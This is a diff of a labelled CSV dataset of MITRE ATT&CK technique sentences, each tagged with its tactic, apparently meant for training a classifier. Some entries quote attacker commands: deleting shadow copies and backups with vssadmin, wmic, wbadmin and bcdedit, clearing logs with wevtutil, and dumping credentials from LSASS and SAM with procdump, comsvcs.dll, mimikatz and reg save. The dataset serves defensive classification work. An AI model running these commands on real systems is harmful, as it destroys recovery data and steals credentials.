 "Adversaries can use netsh.exe helper DLLs to trigger execution of arbitrary code in a persistent manner.",PERSISTENCE,PRIVILEGE_ESCALATION
 "This execution would take place anytime netsh.exe is executed, which could happen automatically, with another persistence technique, or if other software (ex: VPN) is present on the system that executes netsh.exe as part of its normal functionality.",PERSISTENCE,PRIVILEGE_ESCALATION
 "Adversaries may gain persistence and elevate privileges by executing malicious content triggered by PowerShell profiles.",PERSISTENCE,PRIVILEGE_ESCALATION
-"A PowerShell profile  (profile.ps1) is a script that runs when [PowerShell] starts and can be used as a logon script to customize user environments.
-
+"A PowerShell profile  (profile.ps1) is a script that runs when [PowerShell] starts and can be used as a logon script to customize user environments.
+
+
+
 [PowerShell] supports several profiles depending on the user or host program.",PERSISTENCE,PRIVILEGE_ESCALATION
 "For example, there can be different profiles for [PowerShell] host programs such as the PowerShell console, PowerShell ISE or Visual Studio Code.",PERSISTENCE,PRIVILEGE_ESCALATION
 "An administrator can also configure a profile that applies to all users and host programs on the local computer.",PERSISTENCE,PRIVILEGE_ESCALATION
@@ -2031,11 +2150,16 @@ adversaries may also use compromised websites for non-exploitation behavior such
 "Adversaries may establish persistence by executing malicious content triggered by user inactivity.",PERSISTENCE,PRIVILEGE_ESCALATION
 "Screensavers are programs that execute after a configurable time of user inactivity and consist of Portable Executable (PE) files with a .scr file extension.",PERSISTENCE,PRIVILEGE_ESCALATION
 "The Windows screensaver application scrnsave.scr is located in C:\Windows\System32\, and C:\Windows\sysWOW64\  on 64-bit Windows systems, along with screensavers included with base Windows installations.",PERSISTENCE,PRIVILEGE_ESCALATION
-"The following screensaver settings are stored in the Registry (HKCU\Control Panel\Desktop\) and could be manipulated to achieve persistence:
-
-* SCRNSAVE.exe - set to malicious PE path
-* ScreenSaveActive - set to '1' to enable the screensaver
-* ScreenSaverIsSecure - set to '0' to not require a password to unlock
+"The following screensaver settings are stored in the Registry (HKCU\Control Panel\Desktop\) and could be manipulated to achieve persistence:
+
+
+
+* SCRNSAVE.exe - set to malicious PE path
+
+* ScreenSaveActive - set to '1' to enable the screensaver
+
+* ScreenSaverIsSecure - set to '0' to not require a password to unlock
+
 * ScreenSaveTimeout - sets user inactivity timeout before screensaver is executed.",PERSISTENCE,PRIVILEGE_ESCALATION
 "Adversaries can use screensaver settings to maintain persistence by setting the screensaver to run malware after a certain timeframe of user inactivity.",PERSISTENCE,PRIVILEGE_ESCALATION
 "Adversaries may establish persistence by executing malicious content triggered by an interrupt signal.",PERSISTENCE,PRIVILEGE_ESCALATION
@@ -2085,8 +2209,10 @@ adversaries may also use compromised websites for non-exploitation behavior such
 "The data may also be sent to an alternate network location from the main command and control server.",EXFILTRATION
 "Alternate protocols include FTP, SMTP, HTTP/S, DNS, SMB, or any other network protocol not being used as the main command and control channel.",EXFILTRATION
 "Different protocol channels could also include Web services such as cloud storage.",EXFILTRATION
-"Adversaries may also opt to encrypt and/or obfuscate these alternate channels. 
-
+"Adversaries may also opt to encrypt and/or obfuscate these alternate channels. 
+
+
+
 [Exfiltration Over Alternative Protocol] can be done using various common operating system utilities such as [Net]/SMB or FTP.",EXFILTRATION
 "Adversaries may steal data by exfiltrating it over an asymmetrically encrypted network protocol other than that of the existing command and control channel.",EXFILTRATION
 "The data may also be sent to an alternate network location from the main command and control server.",EXFILTRATION
@@ -2145,18 +2271,24 @@ adversaries may also use compromised websites for non-exploitation behavior such
 "Adversaries can take advantage of certain vulnerabilities through targeted exploitation for the purpose of arbitrary code execution.",EXECUTION
 "Oftentimes the most valuable exploits to an offensive toolkit are those that can be used to obtain code execution on a remote system because they can be used to gain access to that system.",EXECUTION
 "Users will expect to see files related to the applications they commonly used to do work, so they are a useful target for exploit research and development because of their high utility.",EXECUTION
-"Several types exist:
-
+"Several types exist:
+
+
+
 ### Browser-based Exploitation.",EXECUTION
 "Web browsers are a common target through [Drive-by Compromise] and [Spearphishing Link].",EXECUTION
 "Endpoint systems may be compromised through normal web browsing or from certain users being targeted by links in spearphishing emails to adversary controlled sites used to exploit the web browser.",EXECUTION
-"These often do not require an action by the user for the exploit to be executed.
-
+"These often do not require an action by the user for the exploit to be executed.
+
+
+
 ### Office Applications.",EXECUTION
 "Common office and productivity applications such as Microsoft Office are also targeted through [Phishing].",EXECUTION
 "Malicious files will be transmitted directly as attachments or through links to download them.",EXECUTION
-"These require the user to open the document or file for the exploit to run.
-
+"These require the user to open the document or file for the exploit to run.
+
+
+
 ### Common Third-party Applications.",EXECUTION
 "Other applications that are commonly seen or are part of the software deployed in a target network may also be used for exploitation.",EXECUTION
 "Applications such as Adobe Reader and Flash, which are common in enterprise environments, have been routinely targeted by adversaries attempting to gain access to systems.",EXECUTION
@@ -2230,10 +2362,13 @@ adversaries may also use compromised websites for non-exploitation behavior such
 "An adversary can send an attachment to a user through spearphishing that contains a resource link to an external server controlled by the adversary (i.e. [Template Injection]), or place a specially crafted file on navigation path for privileged accounts (e.g. .SCF file placed on desktop) or on a publicly accessible share to be accessed by victim(s).",CREDENTIAL_ACCESS
 "When the user's system accesses the untrusted resource it will attempt authentication and send information, including the user's hashed credentials, over SMB to the adversary controlled server.",CREDENTIAL_ACCESS
 "There are several different ways this can occur.",CREDENTIAL_ACCESS
-"Some specifics from in-the-wild use include:
-
+"Some specifics from in-the-wild use include:
+
+
+
 * A spearphishing attachment containing a document with a resource that is automatically loaded when the document is opened (i.e. [Template Injection]).",CREDENTIAL_ACCESS
-"The document can include, for example, a request similar to file[:]//[remote address]/Normal.dotm to trigger the SMB request. 
+"The document can include, for example, a request similar to file[:]//[remote address]/Normal.dotm to trigger the SMB request. 
+
 * A modified .LNK or .SCF file with the icon filename pointing to an external reference such as \\[remote address]\pic.png that will force the system to load the resource when the icon is rendered to repeatedly gather credentials.",CREDENTIAL_ACCESS
 "Adversaries may forge credential materials that can be used to gain access to web applications or Internet services.",CREDENTIAL_ACCESS
 "Web applications and services (hosted in cloud SaaS environments or on-premise servers) often use session cookies, tokens, or other materials to authenticate and authorize user access.",CREDENTIAL_ACCESS
@@ -2634,22 +2769,34 @@ adversaries may also use compromised websites for non-exploitation behavior such
 "Adversaries may also delete the ConsoleHost_history.txt file or edit its contents to hide PowerShell commands they have run.",DEFENSE_EVASION
 "Adversaries may clear system logs to hide evidence of an intrusion. macOS and Linux both keep track of system or user-initiated actions via system logs.",DEFENSE_EVASION
 "The majority of native system logging is stored under the /var/log/ directory.",DEFENSE_EVASION
-"Subfolders in this directory categorize logs by their related functions, such as:
-
-* /var/log/messages:: General and system-related messages
-* /var/log/secure or /var/log/auth.log: Authentication logs
-* /var/log/utmp or /var/log/wtmp: Login records
-* /var/log/kern.log: Kernel logs
-* /var/log/cron.log: Crond logs
-* /var/log/maillog: Mail server logs
+"Subfolders in this directory categorize logs by their related functions, such as:
+
+
+
+* /var/log/messages:: General and system-related messages
+
+* /var/log/secure or /var/log/auth.log: Authentication logs
+
+* /var/log/utmp or /var/log/wtmp: Login records
+
+* /var/log/kern.log: Kernel logs
+
+* /var/log/cron.log: Crond logs
+
+* /var/log/maillog: Mail server logs
+
 * /var/log/httpd/: Web server access and error logs.",DEFENSE_EVASION
 "Adversaries may clear Windows Event Logs to hide the activity of an intrusion.",DEFENSE_EVASION
 "Windows Event Logs are a record of a computer's alerts and notifications.",DEFENSE_EVASION
 "There are three system-defined sources of events: System, Application, and Security, with five event types: Error, Warning, Information, Success Audit, and Failure Audit.",DEFENSE_EVASION
-"The event logs can be cleared with the following utility commands:
-
-* wevtutil cl system
-* wevtutil cl application
+"The event logs can be cleared with the following utility commands:
+
+
+
+* wevtutil cl system
+
+* wevtutil cl application
+
 * wevtutil cl security.",DEFENSE_EVASION
 "These logs may also be cleared through other mechanisms, such as the event viewer GUI or [PowerShell].",DEFENSE_EVASION
 "Adversaries may delete files left behind by the actions of their intrusion activity.",DEFENSE_EVASION
@@ -2676,21 +2823,30 @@ adversaries may also use compromised websites for non-exploitation behavior such
 "This may deny access to available backups and recovery options.",IMPACT
 "Operating systems may contain features that can help fix corrupted systems, such as a backup catalog, volume shadow copies, and automatic repair features.",IMPACT
 "Adversaries may disable or delete system recovery features to augment the effects of [Data Destruction] and [Data Encrypted for Impact].",IMPACT
-"A number of native Windows utilities have been used by adversaries to disable or delete system recovery features:
-
-* vssadmin.exe can be used to delete all volume shadow copies on a system - vssadmin.exe delete shadows /all /quiet
-* [Windows Management Instrumentation] can be used to delete volume shadow copies - wmic shadowcopy delete
-* wbadmin.exe can be used to delete the Windows Backup Catalog - wbadmin.exe delete catalog -quiet
+"A number of native Windows utilities have been used by adversaries to disable or delete system recovery features:
+
+
+
+* vssadmin.exe can be used to delete all volume shadow copies on a system - vssadmin.exe delete shadows /all /quiet
+
+* [Windows Management Instrumentation] can be used to delete volume shadow copies - wmic shadowcopy delete
+
+* wbadmin.exe can be used to delete the Windows Backup Catalog - wbadmin.exe delete catalog -quiet
+
 * bcdedit.exe can be used to disable automatic Windows recovery features by modifying boot configuration data - bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no.",IMPACT
 "Adversaries may use methods of capturing user input to obtain credentials or collect information.",COLLECTION,CREDENTIAL_ACCESS
 "During normal system usage, users often provide credentials to various different locations, such as login pages/portals or system dialog boxes.",COLLECTION,CREDENTIAL_ACCESS
 "Input capture mechanisms may be transparent to the user (e.g. [Credential API Hooking]) or rely on deceiving the user into providing input into what they believe to be a genuine service (e.g. [Web Portal Capture]).",COLLECTION,CREDENTIAL_ACCESS
 "Adversaries may hook into Windows application programming interface (API) functions to collect user credentials.",COLLECTION,CREDENTIAL_ACCESS
 "Malicious hooking mechanisms may capture API calls that include parameters that reveal user authentication credentials.,  this technique focuses specifically on API functions that include parameters that reveal user credentials.",COLLECTION,CREDENTIAL_ACCESS
-"Hooking involves redirecting calls to these functions and can be implemented via:
-
-* **Hooks procedures**, which intercept and execute designated code in response to events such as messages, keystrokes, and mouse inputs.
-* **Import address table (IAT) hooking**, which use modifications to a process’s IAT, where pointers to imported API functions are stored.
+"Hooking involves redirecting calls to these functions and can be implemented via:
+
+
+
+* **Hooks procedures**, which intercept and execute designated code in response to events such as messages, keystrokes, and mouse inputs.
+
+* **Import address table (IAT) hooking**, which use modifications to a process’s IAT, where pointers to imported API functions are stored.
+
 * **Inline hooking**, which overwrites the first bytes in an API function to redirect code flow.",COLLECTION,CREDENTIAL_ACCESS
 "Adversaries may mimic common operating system GUI components to prompt users for credentials with a seemingly legitimate prompt.",COLLECTION,CREDENTIAL_ACCESS
 "When programs are executed that need additional privileges than are present in the current user context, it is common for the operating system to prompt the user for proper credentials to authorize the elevated privileges for the task (ex: [Bypass User Account Control]).",COLLECTION,CREDENTIAL_ACCESS
@@ -2698,13 +2854,19 @@ adversaries may also use compromised websites for non-exploitation behavior such
 "Adversaries may log user keystrokes to intercept credentials as the user types them.",COLLECTION,CREDENTIAL_ACCESS
 "Keylogging is likely to be used to acquire credentials for new access opportunities when [OS Credential Dumping] efforts are not effective, and may require an adversary to intercept keystrokes on a system for a substantial period of time before credentials can be successfully captured.",COLLECTION,CREDENTIAL_ACCESS
 "Keylogging is the most prevalent type of input capture, with many different ways of intercepting keystrokes.",COLLECTION,CREDENTIAL_ACCESS
-"Some methods include:
-
+"Some methods include:
+
+
+
 * Hooking API callbacks used for processing keystrokes.",COLLECTION,CREDENTIAL_ACCESS
-"Unlike [Credential API Hooking], this focuses solely on API functions intended for processing keystroke data.
-* Reading raw keystroke data from the hardware buffer.
-* Windows Registry modifications.
-* Custom drivers.
+"Unlike [Credential API Hooking], this focuses solely on API functions intended for processing keystroke data.
+
+* Reading raw keystroke data from the hardware buffer.
+
+* Windows Registry modifications.
+
+* Custom drivers.
+
 * [Modify System Image] may provide adversaries with hooks into the operating system of network devices to read raw keystrokes for login sessions.",COLLECTION,CREDENTIAL_ACCESS
 "Adversaries may install code on externally facing portals, such as a VPN login page, to capture and transmit credentials of users who attempt to log into the service.",COLLECTION,CREDENTIAL_ACCESS
 "For example, a compromised login page may log provided user credentials before logging the user in to the service.",COLLECTION,CREDENTIAL_ACCESS
@@ -2800,8 +2962,10 @@ adversaries may also use compromised websites for non-exploitation behavior such
 "Skeleton key works through a patch on an enterprise domain controller authentication process (LSASS) with credentials that adversaries may use to bypass the standard authentication system.",CREDENTIAL_ACCESS,DEFENSE_EVASION,PERSISTENCE
 "Once patched, an adversary can use the injected password to successfully authenticate as any domain user account (until the the skeleton key is erased from memory by a reboot of the domain controller).",CREDENTIAL_ACCESS,DEFENSE_EVASION,PERSISTENCE
 "Authenticated access may enable unfettered access to hosts and/or resources within single-factor authentication environments.",CREDENTIAL_ACCESS,DEFENSE_EVASION,PERSISTENCE
-"Adversaries may use [Patch System Image] to hard code a password in the operating system, thus bypassing of native authentication mechanisms for local accounts on network devices.
-
+"Adversaries may use [Patch System Image] to hard code a password in the operating system, thus bypassing of native authentication mechanisms for local accounts on network devices.
+
+
+
 [Modify System Image] may include implanted code to the operating system for network devices to provide access for adversaries using a specific password.",CREDENTIAL_ACCESS,DEFENSE_EVASION,PERSISTENCE
 "The modification includes a specific password which is implanted in the operating system image via the patch.",CREDENTIAL_ACCESS,DEFENSE_EVASION,PERSISTENCE
 "Upon authentication attempts, the inserted code will first check to see if the user input is the password.",CREDENTIAL_ACCESS,DEFENSE_EVASION,PERSISTENCE
@@ -2827,15 +2991,12 @@ adversaries may also use compromised websites for non-exploitation behavior such
 "The AllowReversiblePasswordEncryption property specifies whether reversible password encryption for an account is enabled or disabled.",CREDENTIAL_ACCESS,DEFENSE_EVASION,PERSISTENCE
 "By default this property is disabled (instead storing user credentials as the output of one-way hashing functions) and should not be enabled unless legacy or other software require it.",CREDENTIAL_ACCESS,DEFENSE_EVASION,PERSISTENCE
 "If the property is enabled and/or a user changes their password after it is enabled, an adversary may be able to obtain the plaintext of passwords created/changed after the property was enabled.",CREDENTIAL_ACCESS,DEFENSE_EVASION,PERSISTENCE
-"To decrypt the passwords, an adversary needs four components:
-
-1.",CREDENTIAL_ACCESS,DEFENSE_EVASION,PERSISTENCE
-"Encrypted password (G$RADIUSCHAP) from the Active Directory user-structure userParameters
-2. 16 byte randomly-generated value (G$RADIUSCHAPKEY) also from userParameters
-3.",CREDENTIAL_ACCESS,DEFENSE_EVASION,PERSISTENCE
-"Global LSA secret (G$MSRADIUSCHAPKEY)
-4.",CREDENTIAL_ACCESS,DEFENSE_EVASION,PERSISTENCE
-"Static key hardcoded in the Remote Access Subauthentication DLL (RASSFM.DLL).",CREDENTIAL_ACCESS,DEFENSE_EVASION,PERSISTENCE
+"To decrypt the passwords, an adversary needs four components:
+
+1. Encrypted password (G$RADIUSCHAP) from the Active Directory user-structure userParameters
+2. 16 byte randomly-generated value (G$RADIUSCHAPKEY) also from userParameters
+3. Global LSA secret (G$MSRADIUSCHAPKEY)
+4. Static key hardcoded in the Remote Access Subauthentication DLL (RASSFM.DLL).",CREDENTIAL_ACCESS,DEFENSE_EVASION,PERSISTENCE
 "With this information, an adversary may be able to reproduce the encryption key and subsequently decrypt the encrypted password value.",CREDENTIAL_ACCESS,DEFENSE_EVASION,PERSISTENCE
 "An adversary may set this property at various scopes through Local Group Policy Editor, user properties, Fine-Grained Password Policy (FGPP), or via the ActiveDirectory [PowerShell] module.",CREDENTIAL_ACCESS,DEFENSE_EVASION,PERSISTENCE
 "For example, an adversary may implement and apply a FGPP to users or groups if the Domain Functional Level is set to ""Windows Server 2008"" or higher.",CREDENTIAL_ACCESS,DEFENSE_EVASION,PERSISTENCE
@@ -3023,41 +3184,60 @@ adversaries may also use compromised websites for non-exploitation behavior such
 "Adversaries may attempt to access credentials and other sensitive information by abusing a Windows Domain Controller's application programming interface (API) to simulate the replication process from a remote domain controller using a technique called DCSync.",CREDENTIAL_ACCESS
 "Members of the Administrators, Domain Admins, and Enterprise Admin groups or computer accounts on the domain controller are able to run DCSync to pull password data.",CREDENTIAL_ACCESS
 "DCSync functionality has been included in the ""lsadump"" module in [Mimikatz].",CREDENTIAL_ACCESS
-"Adversaries with SYSTEM access to a host may attempt to access Local Security Authority (LSA) secrets, which can contain a variety of different credential materials, such as credentials for service accounts.
-
+"Adversaries with SYSTEM access to a host may attempt to access Local Security Authority (LSA) secrets, which can contain a variety of different credential materials, such as credentials for service accounts.
+
+
+
 [Reg] can be used to extract from the Registry. [Mimikatz] can be used to extract secrets from memory.",CREDENTIAL_ACCESS
 "Adversaries may attempt to access credential material stored in the process memory of the Local Security Authority Subsystem Service (LSASS).",CREDENTIAL_ACCESS
 "After a user logs on, the system generates and stores a variety of credential materials in LSASS process memory.",CREDENTIAL_ACCESS
 "These credential materials can be harvested by an administrative user or SYSTEM and used to conduct [Lateral Movement] using [Use Alternate Authentication Material].",CREDENTIAL_ACCESS
 "As well as in-memory techniques, the LSASS process memory can be dumped from the target host and analyzed on a local system.",CREDENTIAL_ACCESS
-"For example, on the target host use procdump:
-
+"For example, on the target host use procdump:
+
+
+
 * procdump -ma lsass.exe lsass_dump.",CREDENTIAL_ACCESS
-"Locally, mimikatz can be run using:
-
-* sekurlsa::Minidump lsassdump.dmp
+"Locally, mimikatz can be run using:
+
+
+
+* sekurlsa::Minidump lsassdump.dmp
+
 * sekurlsa::logonPasswords.",CREDENTIAL_ACCESS
-"Built-in Windows tools such as comsvcs.dll can also be used:
-
+"Built-in Windows tools such as comsvcs.dll can also be used:
+
+
+
 * rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump PID  lsass.dmp full.",CREDENTIAL_ACCESS
 "Windows Security Support Provider (SSP) DLLs are loaded into LSSAS process at system start.",CREDENTIAL_ACCESS
 "Once loaded into the LSA, SSP DLLs have access to encrypted and plaintext passwords that are stored in Windows, such as any logged-on user's Domain password or smart card PINs.",CREDENTIAL_ACCESS
 "The SSP configuration is stored in two Registry keys: HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages and HKLM\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\Security Packages.",CREDENTIAL_ACCESS
 "An adversary may modify these Registry keys to add new SSPs, which will be loaded the next time the system boots, or when the AddSecurityPackage Windows API function is called.",CREDENTIAL_ACCESS
-"The following SSPs can be used to access credentials:
-
-* Msv: Interactive logons, batch logons, and service logons are done through the MSV authentication package.
-* Wdigest: The Digest Authentication protocol is designed for use with Hypertext Transfer Protocol (HTTP) and Simple Authentication Security Layer (SASL) exchanges.
-* Kerberos: Preferred for mutual client-server domain authentication in Windows 2000 and later.
+"The following SSPs can be used to access credentials:
+
+
+
+* Msv: Interactive logons, batch logons, and service logons are done through the MSV authentication package.
+
+* Wdigest: The Digest Authentication protocol is designed for use with Hypertext Transfer Protocol (HTTP) and Simple Authentication Security Layer (SASL) exchanges.
+
+* Kerberos: Preferred for mutual client-server domain authentication in Windows 2000 and later.
+
 * CredSSP:  Provides SSO and Network Level Authentication for Remote Desktop Services.",CREDENTIAL_ACCESS
 "Adversaries may attempt to access or create a copy of the Active Directory domain database in order to steal credential information, as well as obtain other information about domain members such as devices, users, and access rights.",CREDENTIAL_ACCESS
 "By default, the NTDS file (NTDS.dit) is located in %SystemRoot%\NTDS\Ntds.dit of a domain controller.",CREDENTIAL_ACCESS
 "In addition to looking for NTDS files on active Domain Controllers, adversaries may search for backups that contain the same or similar information.",CREDENTIAL_ACCESS
-"The following tools and techniques can be used to enumerate the NTDS file and the contents of the entire Active Directory hashes.
-
-* Volume Shadow Copy
-* secretsdump.py
-* Using the in-built Windows tool, ntdsutil.exe
+"The following tools and techniques can be used to enumerate the NTDS file and the contents of the entire Active Directory hashes.
+
+
+
+* Volume Shadow Copy
+
+* secretsdump.py
+
+* Using the in-built Windows tool, ntdsutil.exe
+
 * Invoke-NinjaCopy.",CREDENTIAL_ACCESS
 "Adversaries may gather credentials from information stored in the Proc filesystem or /proc.",CREDENTIAL_ACCESS
 "The Proc filesystem on Linux contains a great deal of information regarding the state of the running operating system.",CREDENTIAL_ACCESS
@@ -3068,20 +3248,31 @@ adversaries may also use compromised websites for non-exploitation behavior such
 "Adversaries may attempt to extract credential material from the Security Account Manager (SAM) database either through in-memory techniques or through the Windows Registry where the SAM database is stored.",CREDENTIAL_ACCESS
 "The SAM is a database file that contains local accounts for the host, typically those found with the net user command.",CREDENTIAL_ACCESS
 "Enumerating the SAM database requires SYSTEM level access.",CREDENTIAL_ACCESS
-"A number of tools can be used to retrieve the SAM file through in-memory techniques:
-
-* pwdumpx.exe
-* [gsecdump]
-* [Mimikatz]
+"A number of tools can be used to retrieve the SAM file through in-memory techniques:
+
+
+
+* pwdumpx.exe
+
+* [gsecdump]
+
+* [Mimikatz]
+
 * secretsdump.py.",CREDENTIAL_ACCESS
-"Alternatively, the SAM can be extracted from the Registry with Reg:
-
-* reg save HKLM\sam sam
+"Alternatively, the SAM can be extracted from the Registry with Reg:
+
+
+
+* reg save HKLM\sam sam
+
 * reg save HKLM\system system.",CREDENTIAL_ACCESS
 "Creddump7 can then be used to process the SAM database locally to retrieve hashes.",CREDENTIAL_ACCESS
-"Notes: 
-* RID 500 account is the local, built-in administrator.
-* RID 501 is the guest account.
+"Notes: 
+
+* RID 500 account is the local, built-in administrator.
+
+* RID 501 is the guest account.
+
 * User accounts start with a RID of 1,000+.",CREDENTIAL_ACCESS
 "Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit.",DEFENSE_EVASION
 "This is common behavior that can be used across different platforms and the network to evade defenses.",DEFENSE_EVASION
@@ -3123,8 +3314,10 @@ adversaries may also use compromised websites for non-exploitation behavior such
 "Example packers are MPRESS and UPX.",DEFENSE_EVASION
 "A more comprehensive list of known packers is available, but adversaries may create their own packing techniques that do not leave the same artifacts as well-known packers to evade defenses.",DEFENSE_EVASION
 "Adversaries may use steganography techniques in order to prevent the detection of hidden information.",DEFENSE_EVASION
-"Steganographic techniques can be used to hide data in digital media such as images, audio tracks, video clips, or text files.
-
+"Steganographic techniques can be used to hide data in digital media such as images, audio tracks, video clips, or text files.
+
+
+
 [Duqu] was an early example of malware that used steganography.",DEFENSE_EVASION
 "It encrypted the gathered information from a victim's system and hid it within an image before exfiltrating the image to a C2 server.",DEFENSE_EVASION
 "By the end of 2017, a threat group used Invoke-PSImage to hide [PowerShell] commands in an image file (.png) and execute the code on a victim's system.",DEFENSE_EVASION
@@ -3207,9 +3400,12 @@ adversaries may also use compromised websites for non-exploitation behavior such
 "An Office Test Registry location exists that allows a user to specify an arbitrary DLL that will be executed every time an Office application is started.",PERSISTENCE
 "This Registry key is thought to be used by Microsoft to load DLLs for testing and debugging purposes while developing Office applications.",PERSISTENCE
 "This Registry key is not created by default during an Office installation.",PERSISTENCE
-"There exist user and global Registry keys for the Office Test feature:
-
-* HKEY_CURRENT_USER\Software\Microsoft\Office test\Special\Perf
+"There exist user and global Registry keys for the Office Test feature:
+
+
+
+* HKEY_CURRENT_USER\Software\Microsoft\Office test\Special\Perf
+
 * HKEY_LOCAL_MACHINE\Software\Microsoft\Office test\Special\Perf.",PERSISTENCE
 "Adversaries may add this Registry key and specify a malicious DLL that will be executed whenever an Office application, such as Word or Excel, is started.",PERSISTENCE
 "Adversaries may abuse Microsoft Outlook forms to obtain persistence on a compromised system.",PERSISTENCE
@@ -3424,12 +3620,17 @@ adversaries may also use compromised websites for non-exploitation behavior such
 "Adversaries may abuse TxF to a perform a file-less variation of [Process Injection].",DEFENSE_EVASION,PRIVILEGE_ESCALATION
 "Similar to [Process Hollowing], process doppelgänging involves replacing the memory of a legitimate process, enabling the veiled execution of malicious code that may evade defenses and detection.",DEFENSE_EVASION,PRIVILEGE_ESCALATION
 "Process doppelgänging's use of TxF also avoids the use of highly-monitored API functions such as NtUnmapViewOfSection, VirtualProtectEx, and SetThreadContext.",DEFENSE_EVASION,PRIVILEGE_ESCALATION
-"Process Doppelgänging is implemented in 4 steps :
-
+"Process Doppelgänging is implemented in 4 steps :
+
+
+
 * Transact – Create a TxF transaction using a legitimate executable then overwrite the file with malicious code.",DEFENSE_EVASION,PRIVILEGE_ESCALATION
-"These changes will be isolated and only visible within the context of the transaction.
-* Load – Create a shared section of memory and load the malicious executable.
-* Rollback – Undo changes to original executable, effectively removing malicious code from the file system.
+"These changes will be isolated and only visible within the context of the transaction.
+
+* Load – Create a shared section of memory and load the malicious executable.
+
+* Rollback – Undo changes to original executable, effectively removing malicious code from the file system.
+
 * Animate – Create a process from the tainted section of memory and initiate execution.",DEFENSE_EVASION,PRIVILEGE_ESCALATION
 "This behavior will likely not result in elevated privileges since the injected process was spawned from (and thus inherits the security context) of the injecting process.",DEFENSE_EVASION,PRIVILEGE_ESCALATION
 "However, execution via process doppelgänging may evade detection from security products since the execution is masked under a legitimate process.",DEFENSE_EVASION,PRIVILEGE_ESCALATION
@@ -3476,8 +3677,10 @@ adversaries may also use compromised websites for non-exploitation behavior such
 "This behavior may conceal malicious traffic by blending in with existing traffic and/or provide an outer layer of encryption (similar to a VPN).",COMMAND_AND_CONTROL
 "Tunneling could also enable routing of network packets that would otherwise not reach their intended destination, such as SMB, RDP, or other traffic that would be filtered by network appliances or not routed over the Internet.",COMMAND_AND_CONTROL
 "There are various means to encapsulate a protocol within another protocol.",COMMAND_AND_CONTROL
-"For example, adversaries may perform SSH tunneling (also known as SSH port forwarding), which involves forwarding arbitrary data over an encrypted SSH tunnel. 
-
+"For example, adversaries may perform SSH tunneling (also known as SSH port forwarding), which involves forwarding arbitrary data over an encrypted SSH tunnel. 
+
+
+
 [Protocol Tunneling] may also be abused by adversaries during [Dynamic Resolution].",COMMAND_AND_CONTROL
 "Known as DNS over HTTPS (DoH), queries to resolve C2 infrastructure may be encapsulated within encrypted HTTPS packets.",COMMAND_AND_CONTROL
 "Adversaries may also leverage [Protocol Tunneling] in conjunction with [Proxy] and/or [Protocol Impersonation] to further conceal C2 communications and infrastructure.",COMMAND_AND_CONTROL
@@ -3539,8 +3742,10 @@ adversaries may also use compromised websites for non-exploitation behavior such
 "It allows a user to connect to another system via an encrypted tunnel, commonly authenticating through a password, certificate or the use of an asymmetric encryption key pair.",LATERAL_MOVEMENT
 "In order to move laterally from a compromised host, adversaries may take advantage of trust relationships established with other systems via public key authentication in active SSH sessions by hijacking an existing connection to another system.",LATERAL_MOVEMENT
 "This may occur through compromising the SSH agent itself or by having access to the agent's socket.",LATERAL_MOVEMENT
-"If an adversary is able to obtain root access, then hijacking SSH sessions is likely trivial.
-
+"If an adversary is able to obtain root access, then hijacking SSH sessions is likely trivial.
+
+
+
 [SSH Hijacking] differs from use of [SSH] because it hijacks an existing SSH session rather than creating a new session using [Valid Accounts].",LATERAL_MOVEMENT
 "Adversaries may use [Valid Accounts] to log into a service specifically designed to accept remote connections, such as telnet, SSH, and VNC.",LATERAL_MOVEMENT
 "The adversary may then perform actions as the logged-on user.",LATERAL_MOVEMENT
@@ -3747,8 +3952,10 @@ adversaries may also use compromised websites for non-exploitation behavior such
 "VB .NET, C#, etc.).",PERSISTENCE
 "Adversaries may abuse components of Terminal Services to enable persistent access to systems.",PERSISTENCE
 "Microsoft Terminal Services, renamed to Remote Desktop Services in some Windows Server OSs as of 2022, enable remote terminal connections to hosts.",PERSISTENCE
-"Terminal Services allows servers to transmit a full, interactive, graphical user interface to clients via RDP.
-
+"Terminal Services allows servers to transmit a full, interactive, graphical user interface to clients via RDP.
+
+
+
 [Windows Service]s that are run as a ""generic"" process (ex: svchost.exe) load the service's DLL file, the location of which is stored in a Registry entry named ServiceDll.",PERSISTENCE
 "The termsrv.dll file, typically stored in `%SystemRoot%\System32\`, is the default ServiceDll value for Terminal Services in `HKLM\System\CurrentControlSet\services\TermService\Parameters\`.",PERSISTENCE
 "Adversaries may modify and/or replace the Terminal Services DLL to enable persistent access to victimized hosts.",PERSISTENCE
@@ -3770,14 +3977,22 @@ adversaries may also use compromised websites for non-exploitation behavior such
 "Adversaries may execute malicious payloads via loading shared modules.",EXECUTION
 "The Windows module loader can be instructed to load DLLs from arbitrary local paths and arbitrary Universal Naming Convention (UNC) network paths.",EXECUTION
 "This functionality resides in NTDLL.dll and is part of the Windows [Native API] which is called from functions like CreateProcess, LoadLibrary, etc. of the Win32 API.",EXECUTION
-"The module loader can load DLLs:
-
-* via specification of the (fully-qualified or relative) DLL pathname in the IMPORT directory;
-    
-* via EXPORT forwarded to another DLL, specified with (fully-qualified or relative) pathname (but without extension);
-    
-* via an NTFS junction or symlink program.exe.local with the fully-qualified or relative pathname of a directory containing the DLLs specified in the IMPORT directory or forwarded EXPORTs;
-    
+"The module loader can load DLLs:
+
+
+
+* via specification of the (fully-qualified or relative) DLL pathname in the IMPORT directory;
+
+    
+
+* via EXPORT forwarded to another DLL, specified with (fully-qualified or relative) pathname (but without extension);
+
+    
+
+* via an NTFS junction or symlink program.exe.local with the fully-qualified or relative pathname of a directory containing the DLLs specified in the IMPORT directory or forwarded EXPORTs;
+
+    
+
 * via &#x3c;file name=""filename.extension"" loadFrom=""fully-qualified or relative pathname""&#x3e; in an embedded or external ""application manifest"".",EXECUTION
 "The file name refers to an entry in the IMPORT directory or a forwarded EXPORT.",EXECUTION
 "Adversaries may use this functionality as a way to execute arbitrary payloads on a victim system.",EXECUTION
@@ -3801,11 +4016,16 @@ adversaries may also use compromised websites for non-exploitation behavior such
 "To support their operations, an adversary may need to take capabilities they developed ([Develop Capabilities]) or obtained ([Obtain Capabilities]) and stage them on infrastructure under their control.",RESOURCE_DEVELOPMENT
 "These capabilities may be staged on infrastructure that was previously purchased/rented by the adversary ([Acquire Infrastructure]) or was otherwise compromised by them ([Compromise Infrastructure]).",RESOURCE_DEVELOPMENT
 "Capabilities can also be staged on web services, such as GitHub or Pastebin.",RESOURCE_DEVELOPMENT
